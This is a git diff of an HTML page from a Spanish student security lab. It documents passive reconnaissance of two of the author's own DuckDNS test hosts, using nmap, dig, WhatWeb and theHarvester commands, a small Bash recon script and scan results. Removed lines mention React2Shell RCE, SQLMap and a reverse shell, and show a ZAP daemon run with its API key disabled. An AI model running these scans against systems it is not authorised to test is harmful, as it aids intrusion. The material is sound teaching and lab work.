@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fase Ofensiva: Reconocimiento y Pentesting</title>
+    <title>Fase Ofensiva: Reconocimiento Pasivo y Mapeo Perimetral</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="../assets/css/site.css">
 </head>
@@ -31,21 +31,23 @@
         <aside class="lg:sticky lg:top-6 lg:h-[calc(100vh-3rem)] lg:w-80 lg:shrink-0">
             <div class="h-full overflow-y-auto rounded-3xl border border-slate-200 bg-white p-6 shadow-2xl shadow-slate-300/35 backdrop-blur">
                 <div class="flex items-start gap-4">
-                    <div class="flex h-12 w-12 items-center justify-center rounded-2xl bg-red-600 text-white font-bold">ATK</div>
+                    <div class="flex h-12 w-12 items-center justify-center rounded-2xl bg-orange-600 text-white font-bold">RECO</div>
                     <div>
-                        <p class="text-xs font-bold uppercase tracking-[0.3em] text-red-700">Fase Ofensiva</p>
-                        <h1 class="mt-1 text-2xl font-black text-slate-950">Pentesting</h1>
+                        <p class="text-xs font-bold uppercase tracking-[0.3em] text-orange-700">Fase Ofensiva</p>
+                        <h1 class="mt-1 text-2xl font-black text-slate-950">Mapeo y Recon</h1>
                     </div>
                 </div>
 
                 <nav class="mt-8 space-y-2 text-sm">
                     <a href="#portada" class="nav-link">Portada</a>
-                    <a href="#recon" class="nav-link">Reconocimiento</a>
-                    <a href="#vuln" class="nav-link">Análisis de Vulnerabilidades</a>
-                    <a href="#sqli" class="nav-link">Vector 1: SQL Injection</a>
-                    <a href="#rce" class="nav-link">Vector 2: RCE React2Shell</a>
-                    <a href="#post" class="nav-link">Post-Explotación</a>
-                    <a href="#informe" class="nav-link">Informe de Pentest</a>
+                    <a href="#metodologia" class="nav-link">Metodología</a>
+                    <a href="#webinsegura1" class="nav-link">Análisis: webinsegura1</a>
+                    <a href="#webinsegura2" class="nav-link">Análisis: webinsegura2</a>
+                    <a href="#whatweb-dig" class="nav-link">WhatWeb & DIG</a>
+                    <a href="#whois-harvester" class="nav-link">WHOIS & theHarvester</a>
+                    <a href="#spiderfoot" class="nav-link">SpiderFoot</a>
+                    <a href="#guia-script" class="nav-link">Guía de Ejecución</a>
+                    <a href="pendiente.html" class="nav-link border-red-200 bg-red-50 text-red-900">Ir a Explotación (Parte 2)</a>
                     <a href="../index.html" class="nav-link border-cyan-200 bg-cyan-50 text-cyan-900">Volver al menú principal</a>
                 </nav>
 
@@ -57,296 +59,462 @@
         </aside>
 
         <section class="min-w-0 flex-1 space-y-6 pb-10">
+            <!-- Portada -->
             <header id="portada" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-2xl shadow-slate-300/30 md:p-10">
-                <p class="hero-pill">Auditoría Ofensiva</p>
-                <h2 class="mt-4 text-3xl font-black tracking-tight text-slate-950 md:text-5xl">Guía de Ataques y Auditorías Perimetrales</h2>
+                <p class="hero-pill">Auditoría Ofensiva — Parte 1</p>
+                <h2 class="mt-4 text-3xl font-black tracking-tight text-slate-950 md:text-5xl">Reconocimiento Pasivo y Escaneo Perimetral</h2>
                 <p class="mt-4 max-w-4xl text-base leading-8 text-slate-700 md:text-lg">
-                    Este manual recoge las metodologías de reconocimiento activo y pasivo, análisis automatizado de CVEs, explotación y post-explotación del laboratorio, simuladas desde la máquina atacante Kali Linux.
+                    Este laboratorio documenta la fase inicial de reconocimiento pasivo y mapeo técnico perimetral contra la infraestructura del TFG. Se analiza la huella digital técnica y los límites del direccionamiento DDNS mediante Nmap, resolución DNS avanzada, WhatWeb, WHOIS, theHarvester y SpiderFoot.
                 </p>
             </header>
 
-            <section id="recon" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
-                <h3 class="text-2xl font-bold text-slate-950">1. Reconocimiento con 5 Herramientas</h3>
-                <p class="mt-3 leading-8 text-slate-700">Mapeo de la superficie de ataque perimetral utilizando herramientas pasivas y activas orientadas a los subdominios DuckDNS.</p>
+            <!-- Metodología -->
+            <section id="metodologia" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
+                <h3 class="text-2xl font-bold text-slate-950">🧪 Metodología de Mapeo Perimetral</h3>
+                <p class="mt-3 leading-8 text-slate-700">
+                    La recolección de información se ha llevado a cabo de manera centralizada desde la estación de ataque <strong>Kali Linux</strong>, persiguiendo un flujo estructurado de recolección de huella digital y escaneo de puertos:
+                </p>
+                <ul class="list-disc pl-5 mt-4 space-y-2 text-sm text-slate-700">
+                    <li><strong>Comprobaciones de red:</strong> Análisis previo de estabilidad del DNS con <code>nslookup</code> y comprobación de ping.</li>
+                    <li><strong>Escaneo rápido (-F):</strong> Mapeo inicial de los 100 puertos TCP más habituales para discriminar la superficie de exposición inmediata.</li>
+                    <li><strong>Escaneo detallado (-sV -sC -Pn):</strong> Determinación minuciosa de servicios, versiones y ejecución de scripts automatizados NSE.</li>
+                    <li><strong>Sin descubrimiento de host (-Pn):</strong> Omisión del ping ICMP básico debido al filtrado perimetral por defecto en entornos de DDNS.</li>
+                    <li><strong>Automatización:</strong> Implementación del script personalizado en Bash (<code>auditor_seguridad.sh</code>) para agrupar las peticiones DNS (dig), la obtención de cabeceras seguras (curl) y la enumeración de tecnologías (WhatWeb).</li>
+                </ul>
 
-                <div class="mt-6 space-y-6">
-                    <div>
-                        <h4 class="font-bold text-slate-900">1. Nmap (Escaneo activo)</h4>
-                        <p class="text-sm text-slate-600 mt-1">Escaneo de puertos TCP, fingerprint de servicios y scripts por defecto en el subdominio principal.</p>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Terminal Kali Linux</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-nmap')">Copiar</button>
-                            </div>
-                            <pre id="code-nmap" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>nmap -sV -sC -Pn webinsegura1.duckdns.org</code></pre>
+                <div class="mt-6">
+                    <p class="text-sm font-semibold text-slate-900">Script de Automatización propio: <code>auditor_seguridad.sh</code></p>
+                    <div class="code-shell mt-2">
+                        <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                            <span>auditor_seguridad.sh</span>
+                            <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-auditor-script')">Copiar</button>
                         </div>
+                        <pre id="code-auditor-script" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>#!/bin/bash
+DOMINIOS=("webinsegura1.duckdns.org" "webinsegura2.duckdns.org")
+DIR_SALIDA="reporte_reconocimiento"
+mkdir -p $DIR_SALIDA
+for DOMINIO in "${DOMINIOS[@]}"; do
+    echo "[*] Iniciando auditoría para: $DOMINIO"
+    CARPETA="$DIR_SALIDA/$DOMINIO"
+    mkdir -p $CARPETA
+    dig NS $DOMINIO +short > "$CARPETA/dns_ns.txt"
+    dig MX $DOMINIO +short > "$CARPETA/dns_mx.txt"
+    dig A $DOMINIO +short > "$CARPETA/dns_a.txt"
+    curl -I -s -k "https://$DOMINIO" > "$CARPETA/headers.txt"
+    whatweb "$DOMINIO" --log-brief="$CARPETA/tecnologias.txt"
+    echo "[*] Finalizado: $DOMINIO"
+done</code></pre>
                     </div>
-
-                    # aqui agrega la captura nmap.png con descripcion
-
-                    <div>
-                        <h4 class="font-bold text-slate-900">2. Whois / DNSdumpster (Reconocimiento pasivo)</h4>
-                        <p class="text-sm text-slate-600 mt-1">Inspección de registros DNS públicos e información de registro de red para los dominios de prueba.</p>
-                    </div>
-
-                    # aqui agrega la captura dnsdumpster.png con descripcion
-
-                    <div>
-                        <h4 class="font-bold text-slate-900">3. The Harvester (Búsqueda de OSINT)</h4>
-                        <p class="text-sm text-slate-600 mt-1">Extracción de correos electrónicos, subdominios y hosts expuestos en fuentes abiertas como Bing.</p>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Terminal Kali Linux</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-harvester')">Copiar</button>
-                            </div>
-                            <pre id="code-harvester" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>theHarvester -d duckdns.org -b bing</code></pre>
-                        </div>
-                    </div>
-
-                    # aqui agrega la captura harvester.png con descripcion
-
-                    <div>
-                        <h4 class="font-bold text-slate-900">4. SpiderFoot (Mapeo automatizado)</h4>
-                        <p class="text-sm text-slate-600 mt-1">Escaneo modular pasivo para agrupar todas las relaciones e información de DNS, IP y geolocalización.</p>
-                    </div>
-
-                    # aqui agrega la captura spiderfoot.png con descripcion
-
-                    <div>
-                        <h4 class="font-bold text-slate-900">5. Script Python Propio (Extracción de Headers)</h4>
-                        <p class="text-sm text-slate-600 mt-1">Comprobación del puerto HTTPS 443 activo y lectura de cabeceras HTTP de Nginx/Apache.</p>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>recon_wan.py</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-python')">Copiar</button>
-                            </div>
-                            <pre id="code-python" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>import socket
-import requests
-
-# Verificar puerto 443 abierto
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(3)
-resultado = s.connect_ex(('webinsegura1.duckdns.org', 443))
-print(f"Puerto 443 abierto: {resultado == 0}")
-
-# Consultar y mostrar las cabeceras HTTP expuestas
-r = requests.get('https://webinsegura1.duckdns.org', verify=False)
-for header, value in r.headers.items():
-    print(f"{header}: {value}")</code></pre>
-                        </div>
-                    </div>
-
-                    # aqui agrega la captura script_python.png con descripcion
                 </div>
-             <section id="vuln" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20 space-y-6">
-                <h3 class="text-2xl font-bold text-slate-950">2. Análisis de Vulnerabilidades con CVE</h3>
-                <p class="mt-3 leading-8 text-slate-700">Ejecución del análisis estático y dinámico para mapear fallos de software frente a la base de datos oficial de CVEs.</p>
+            </section>
 
-                <div class="space-y-4">
-                    <p class="text-sm leading-7 text-slate-700"><strong>OWASP ZAP / OpenVAS:</strong> El análisis automatizado del dominio reportará fallos graves relacionados con el entorno vulnerable.</p>
+            <!-- webinsegura1 -->
+            <section id="webinsegura1" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20 space-y-6">
+                <div>
+                    <h3 class="text-2xl font-bold text-slate-950">🟦 1. Análisis de webinsegura1.duckdns.org</h3>
+                    <p class="text-sm text-slate-600 mt-1">Máquina correspondiente al backend y la aplicación moderna (React2Shell en Next.js).</p>
+                </div>
+
+                <div>
+                    <h4 class="font-bold text-slate-900">1.1 Resolución DNS e ICMP Ping</h4>
+                    <p class="text-sm text-slate-700 mt-1">Verificación inicial mediante <code>nslookup</code> para confirmar la IP asignada por DuckDNS y prueba de disponibilidad directa.</p>
+                    
+                    <div class="mt-4">
+                        <img src="../assets/reco1/image1.png" alt="Resolución DNS de webinsegura1 y fallo de ping" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 1: Consulta nslookup exitosa hacia la IP de laboratorio y ping fallido con 100% de pérdida.</p>
+                    </div>
+
+                    <!-- Incidencia -->
+                    <div class="warning-box">
+                        <div class="warning-box-header">Incidencias ⚠️</div>
+                        <div class="warning-box-content">
+                            <p><strong>Pérdida de Paquetes en Ping:</strong> El comando <code>ping</code> hacia <code>webinsegura1.duckdns.org</code> devuelve <em>100% packet loss</em>. Esto ocurre debido a que la infraestructura WAN del host de destino o los enrutadores intermedios descartan de forma estática los paquetes ICMP Echo Request. Se hace imprescindible utilizar el parámetro <code>-Pn</code> en los escaneos de Nmap para forzar el análisis de puertos considerando que el host está activo.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="pt-4 border-t border-slate-100">
+                    <h4 class="font-bold text-slate-900">1.2 Escaneo rápido (-F)</h4>
+                    <p class="text-sm text-slate-700 mt-1">Evaluación rápida de la lista reducida de puertos TCP comunes.</p>
+                    <div class="code-shell mt-3">
+                        <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                            <span>Terminal Kali Linux</span>
+                            <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-nmap-f1')">Copiar</button>
+                        </div>
+                        <pre id="code-nmap-f1" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>nmap -F -Pn webinsegura1.duckdns.org</code></pre>
+                    </div>
+
+                    <div class="mt-4">
+                        <img src="../assets/reco1/image2.png" alt="Escaneo rápido en webinsegura1" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 2: Resultado de Nmap rápido con todos los puertos TCP comunes filtrados.</p>
+                    </div>
+
+                    <!-- Incidencia -->
+                    <div class="warning-box">
+                        <div class="warning-box-header">Incidencias ⚠️</div>
+                        <div class="warning-box-content">
+                            <p><strong>Puertos filtrados (no-response):</strong> Todos los puertos del escaneo rápido devuelven estado <em>filtered</em>. Esto revela que existe un firewall activo que está descartando de manera silenciosa las tramas TCP SYN, impidiendo determinar si los puertos están abiertos mediante escaneos superficiales.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="pt-4 border-t border-slate-100">
+                    <h4 class="font-bold text-slate-900">1.3 Escaneo Completo (-sV -sC -Pn)</h4>
+                    <p class="text-sm text-slate-700 mt-1">Análisis profundo sobre los 1000 puertos TCP por defecto para identificar posibles servicios alternativos o puertos específicos.</p>
+                    <div class="code-shell mt-3">
+                        <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                            <span>Terminal Kali Linux</span>
+                            <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-nmap-full1')">Copiar</button>
+                        </div>
+                        <pre id="code-nmap-full1" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>nmap -sV -sC -Pn webinsegura1.duckdns.org</code></pre>
+                    </div>
+
+                    <div class="mt-4">
+                        <img src="../assets/reco1/image3.png" alt="Escaneo detallado en webinsegura1" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 3: Salida del escaneo detallado confirmando la inexistencia de puertos expuestos públicamente.</p>
+                    </div>
+
+                    <!-- Incidencia -->
+                    <div class="warning-box">
+                        <div class="warning-box-header">Incidencias ⚠️</div>
+                        <div class="warning-box-content">
+                            <p><strong>Bloqueo Perimetral Total:</strong> El escaneo profundo confirma que los 1000 puertos analizados están bajo la clasificación de <em>filtered (no-response)</em>. El host está activo en la IP resuelta, pero no expone ningún puerto al exterior bajo este subdominio específico en el momento de la auditoría.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- webinsegura2 -->
+            <section id="webinsegura2" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20 space-y-6">
+                <div>
+                    <h3 class="text-2xl font-bold text-slate-950">🟩 2. Análisis de webinsegura2.duckdns.org</h3>
+                    <p class="text-sm text-slate-600 mt-1">Máquina correspondiente al entorno vulnerable DVWA expuesto sobre el servidor Apache.</p>
+                </div>
+
+                <div>
+                    <h4 class="font-bold text-slate-900">2.1 Resolución DNS</h4>
+                    <p class="text-sm text-slate-700 mt-1">Comprobación del estado del dominio webinsegura2 para contrastar la IP y asegurar resolución correcta antes del análisis de puertos.</p>
+                    
+                    <div class="mt-4">
+                        <img src="../assets/reco1/image4.png" alt="Resolución DNS de webinsegura2" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 4: Terminal indicando resolución estable de webinsegura2 apuntando a la misma dirección IP pública.</p>
+                    </div>
+                </div>
+
+                <div class="pt-4 border-t border-slate-100">
+                    <h4 class="font-bold text-slate-900">2.2 Escaneo rápido (-F)</h4>
+                    <p class="text-sm text-slate-700 mt-1">Escaneo superficial de los puertos TCP más frecuentes en la máquina DVWA.</p>
+                    <div class="code-shell mt-3">
+                        <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
+                            <span>Terminal Kali Linux</span>
+                            <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-nmap-f2')">Copiar</button>
+                        </div>
+                        <pre id="code-nmap-f2" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>nmap -F -Pn webinsegura2.duckdns.org</code></pre>
+                    </div>
+
+                    <div class="mt-4">
+                        <img src="../assets/reco1/image5.png" alt="Escaneo rápido en webinsegura2" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 5: Detección de puerto 443/tcp (HTTPS) en estado OPEN, mientras que el resto permanece filtrado.</p>
+                    </div>
+
+                    <!-- Incidencia -->
+                    <div class="warning-box">
+                        <div class="warning-box-header">Incidencias ⚠️</div>
+                        <div class="warning-box-content">
+                            <p><strong>Cierre del Puerto 80 (HTTP):</strong> A diferencia de previas configuraciones del laboratorio donde el puerto 80 estaba accesible, en esta fase el puerto 80 aparece como <em>filtered</em>. Esto se debe a la aplicación del bloqueo perimetral específico y a la obligatoriedad del tráfico cifrado en HTTPS (puerto 443).</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="pt-4 border-t border-slate-100">
+                    <h4 class="font-bold text-slate-900">2.3 Escaneo Completo e Interrupción de Resolución</h4>
+                    <p class="text-sm text-slate-700 mt-1">Lanzamiento del escaneo de firmas de servicios y scripts vulnerables sobre la máquina DVWA.</p>
+                    
+                    <div class="mt-4">
+                        <img src="../assets/reco1/image6.png" alt="Error de resolución DNS en escaneo detallado" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 6: Error de Nmap al fallar la resolución DNS intermedia de webinsegura2.</p>
+                    </div>
+
+                    <!-- Incidencia -->
+                    <div class="warning-box">
+                        <div class="warning-box-header">Incidencias ⚠️</div>
+                        <div class="warning-box-content">
+                            <p><strong>Fallo Crítico de Resolución DNS en Ejecución:</strong> Nmap detuvo su ejecución con el error <code>Failed to resolve "webinsegura2.duckdns.org". WARNING: No targets were specified</code>. A pesar de que la resolución DNS inicial con nslookup fue satisfactoria, los servidores de DuckDNS sufrieron una caída temporal de servicio o denegaron las peticiones sucesivas originadas por la alta tasa de consultas de Nmap, impidiendo al escáner obtener la dirección IP del objetivo.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="pt-4 border-t border-slate-100">
+                    <h4 class="font-bold text-slate-900">2.4 Confirmación de Servicio HTTPS Activo</h4>
+                    <p class="text-sm text-slate-700 mt-1">Acceso a la interfaz web para verificar que el servidor Apache está sirviendo DVWA adecuadamente a través del canal seguro cifrado.</p>
+                    
+                    <div class="mt-4">
+                        <img src="../assets/service_dvwa.png" alt="DVWA Login en HTTPS" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura: Interfaz de autenticación de Damn Vulnerable Web Application accesible en https://webinsegura2.duckdns.org/login.php.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- WhatWeb & DIG -->
+            <section id="whatweb-dig" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20 space-y-6">
+                <div>
+                    <h3 class="text-2xl font-bold text-slate-950">🔍 3. WhatWeb y Consultas DIG</h3>
+                    <p class="text-sm text-slate-600 mt-1">Fingerprinting del servidor HTTP y análisis estructural de registros DNS directos.</p>
+                </div>
+
+                <div>
+                    <h4 class="font-bold text-slate-900">3.1 WhatWeb — Tecnologías y Cabeceras</h4>
+                    <p class="text-sm text-slate-700">WhatWeb ha revelado de forma pasiva la pila de componentes sobre la que corre cada sitio web:</p>
                     
                     <div class="overflow-x-auto mt-4">
                         <table class="min-w-full divide-y divide-slate-200 text-sm">
                             <thead>
                                 <tr>
-                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Vector / Vulnerabilidad</th>
-                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">CVSS v3.1</th>
-                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">ID CVE / Tipo</th>
-                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Descripción Corta</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Dominio de Prueba</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Tecnologías Identificadas</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Cabeceras Relevantes</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Comportamiento Inicial</th>
                                 </tr>
                             </thead>
                             <tbody class="divide-y divide-slate-100">
                                 <tr>
-                                    <td class="px-4 py-3 font-semibold text-red-700">React2Shell (Next.js)</td>
-                                    <td class="px-4 py-3 text-red-650 font-bold">10.0 (Crítica)</td>
-                                    <td class="px-4 py-3 font-mono">CVE-2025-55182 / CVE-2025-66478</td>
-                                    <td class="px-4 py-3 text-slate-650">Deserialización RCE insegura en el protocolo Flight de componentes React.</td>
+                                    <td class="px-4 py-3 font-semibold text-slate-900">webinsegura1.duckdns.org</td>
+                                    <td class="px-4 py-3 text-slate-700">Apache 2.4.67 (Debian), Next.js Framework</td>
+                                    <td class="px-4 py-3 font-mono text-xs">X-Powered-By: Next.js</td>
+                                    <td class="px-4 py-3 text-emerald-700 font-semibold">Redirección 301 (HTTP a HTTPS)</td>
                                 </tr>
                                 <tr>
-                                    <td class="px-4 py-3 font-semibold text-amber-700">Inyección SQL (DVWA)</td>
-                                    <td class="px-4 py-3 text-amber-650 font-bold">7.5 (Alta)</td>
-                                    <td class="px-4 py-3 font-mono">CWE-89 / SQLi</td>
-                                    <td class="px-4 py-3 text-slate-650">Falta de sanitización de parámetros en formularios de acceso a la DB.</td>
+                                    <td class="px-4 py-3 font-semibold text-slate-900">webinsegura2.duckdns.org</td>
+                                    <td class="px-4 py-3 text-slate-700">Apache 2.4.54 (Debian), PHP 8.1.16, DVWA App</td>
+                                    <td class="px-4 py-3 font-mono text-xs">PHPSESSID, security (cookies)</td>
+                                    <td class="px-4 py-3 text-emerald-700 font-semibold">Redirección 302 (HTTP a login.php)</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="pt-4 border-t border-slate-100">
+                    <h4 class="font-bold text-slate-900">3.2 DIG — Consulta de Registros de Zona</h4>
+                    <p class="text-sm text-slate-700">Se ejecutaron comandos estructurados en DIG para auditar la presencia de delegaciones internas y registros específicos (ANY, NS, MX, TXT, A).</p>
+                    
+                    <div class="overflow-x-auto mt-4">
+                        <table class="min-w-full divide-y divide-slate-200 text-sm">
+                            <thead>
+                                <tr>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Registro</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Resultado de la Consulta</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Causa Técnica / Interpretación</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-slate-100">
+                                <tr>
+                                    <td class="px-4 py-3 font-mono font-bold text-red-700">dig ANY</td>
+                                    <td class="px-4 py-3 text-red-600 font-semibold">Fallo (no servers could be reached)</td>
+                                    <td class="px-4 py-3 text-slate-700">El servicio DuckDNS deniega por completo las peticiones ANY para mitigar ataques de amplificación DNS.</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-3 font-mono font-bold text-amber-700">dig NS</td>
+                                    <td class="px-4 py-3 text-slate-650">Vacío (No DATA)</td>
+                                    <td class="px-4 py-3 text-slate-700">No existe delegación de servidores de nombres en subdominios dinámicos individuales. Solo la raíz posee NS.</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-3 font-mono font-bold text-emerald-700">dig MX</td>
+                                    <td class="px-4 py-3 text-slate-600 font-mono text-xs">50 webinsegura1.duckdns.org.</td>
+                                    <td class="px-4 py-3 text-slate-700">DuckDNS genera un MX genérico apuntando al propio subdominio, aunque no exista un servicio SMTP funcional en la máquina.</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-3 font-mono font-bold text-slate-900">dig A</td>
+                                    <td class="px-4 py-3 text-slate-800 font-mono">5.40.33.18</td>
+                                    <td class="px-4 py-3 text-slate-700">Devuelve con éxito la dirección IP pública del enrutador donde se aloja el laboratorio.</td>
                                 </tr>
                             </tbody>
                         </table>
                     </div>
 
-                    # aqui agrega la captura scan_report.png con descripcion
-                    # aqui agrega la captura ssl_test.png con descripcion
-                </div>
-
-                <div class="space-y-4 border-t border-slate-100 pt-6">
-                    <h4 class="text-xl font-bold text-slate-950">Estrategia Táctica: Centralización en Kali Linux</h4>
-                    <p class="text-sm leading-7 text-slate-700">
-                        Para mantener una higiene metodológica profesional y facilitar el posterior filtrado de eventos en el SIEM, se recomienda centralizar todas las herramientas ofensivas desde tu máquina <strong>Kali Linux</strong>:
-                    </p>
-                    <ul class="list-disc pl-5 space-y-2 text-sm text-slate-700">
-                        <li><strong>Consistencia de IP:</strong> Al lanzar los ataques y escaneos de vulnerabilidades desde una sola IP en Kali, se simplifica el filtrado en el <code>access.log</code> de Nginx y en los paneles de Wazuh.</li>
-                        <li><strong>Gestión unificada:</strong> Se evita fragmentar la superficie de ataque entre sistemas Windows y Kali, manteniendo las trazas en un único nodo origen.</li>
-                    </ul>
-                </div>
-
-                <div class="space-y-4 border-t border-slate-100 pt-6">
-                    <h4 class="text-xl font-bold text-slate-950">Ejecución de OWASP ZAP desde Kali (Entorno Remoto o Headless)</h4>
-                    <p class="text-sm leading-7 text-slate-700">
-                        Si estás operando sobre una VM de Kali sin entorno de escritorio o deseas realizar los escaneos en segundo plano:
-                    </p>
-                    <div class="mt-4">
-                        <p class="text-sm text-slate-600"><strong>Opción A: Ejecución gráfica clásica</strong></p>
-                        <div class="code-shell mt-2">
-                            <pre class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>zaproxy</code></pre>
+                    <!-- Incidencia -->
+                    <div class="warning-box">
+                        <div class="warning-box-header">Incidencias ⚠️</div>
+                        <div class="warning-box-content">
+                            <p><strong>Fallo en dig ANY:</strong> La petición DNS del tipo ANY al DNS dinámico retorna errores o denegaciones persistentes. Los proveedores de DNS dinámico protegen sus servidores DNS autoritativos bloqueando este tipo de consultas masivas.</p>
                         </div>
                     </div>
-                    <div class="mt-4">
-                        <p class="text-sm text-slate-600"><strong>Opción B: Modo Daemon con API Web (Acceso remoto)</strong></p>
-                        <p class="text-xs text-slate-500 mt-1">Lanza el escáner como servicio en la terminal de Kali y accede al asistente gráfico desde el navegador de tu máquina Windows principal:</p>
-                        <div class="code-shell mt-2">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Terminal Kali Linux (Headless)</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-zap-daemon')">Copiar</button>
-                            </div>
-                            <pre id="code-zap-daemon" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.disablekey=true</code></pre>
-                        </div>
-                        <p class="text-xs text-slate-500 mt-2">Una vez ejecutado, accede en el host a: <code>http://IP_DE_KALI:8080</code> para usar la API interactiva.</p>
-                    </div>
-                </div>
-
-                <div class="space-y-4 border-t border-slate-100 pt-6">
-                    <h4 class="text-xl font-bold text-slate-950">Flujo Recomendado de Pentesting</h4>
-                    <p class="text-sm leading-7 text-slate-700">
-                        Para maximizar las evidencias y registros en el SOC, sigue esta secuencia lógica de ejecución:
-                    </p>
-                    <ol class="list-decimal pl-5 space-y-2 text-sm text-slate-700">
-                        <li><strong>Fase 1: Reconocimiento:</strong> Ejecución de escaneos DNS y <code>nmap</code>.</li>
-                        <li><strong>Fase 2: Escaneo DAST:</strong> Lanzar OWASP ZAP a los dos subdominios DuckDNS para registrar el tráfico en Wazuh.</li>
-                        <li><strong>Fase 3: Explotación y Control:</strong> Explotar el panel de login/búsqueda con SQLMap y detonar la shell reversa por RCE.</li>
-                    </ol>
                 </div>
             </section>
 
-            <section id="sqli" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
-                <h3 class="text-2xl font-bold text-slate-950">3. Vector 1: SQL Injection en DVWA</h3>
-                <p class="mt-3 leading-8 text-slate-700">Explotación del parámetro de identificación en la base de datos de DVWA e interceptación del tráfico HTTP.</p>
+            <!-- WHOIS & theHarvester -->
+            <section id="whois-harvester" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20 space-y-6">
+                <div>
+                    <h3 class="text-2xl font-bold text-slate-950">📌 4. WHOIS y theHarvester</h3>
+                    <p class="text-sm text-slate-600 mt-1">Análisis de la información de titularidad pública y auditoría de metadatos/direcciones indexadas.</p>
+                </div>
 
-                <div class="mt-6 space-y-6">
